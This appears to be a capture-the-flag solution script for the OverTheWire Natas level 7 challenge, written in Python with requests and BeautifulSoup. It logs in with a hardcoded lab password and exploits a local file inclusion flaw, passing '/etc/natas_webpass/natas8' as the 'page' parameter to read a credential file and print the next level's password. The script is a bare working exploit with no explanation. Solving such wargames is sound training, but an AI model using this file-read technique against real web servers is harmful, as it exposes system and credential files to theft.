import requests
import re
import html
from bs4 import BeautifulSoup
import colorama
from colorama import Fore, Style

colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)

username = 'natas7'
password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'

url = f'http://{username}.natas.labs.overthewire.org'
params = {"page": "/etc/natas_webpass/natas8"}

resp = requests.get(url=url, auth=(username, password), params=params)

soup = BeautifulSoup(html.unescape(resp.text), 'lxml')

print("Natas8: ", end="")
print(re.findall('\n(.*)\n\n\n\n', soup.body.text)[0])

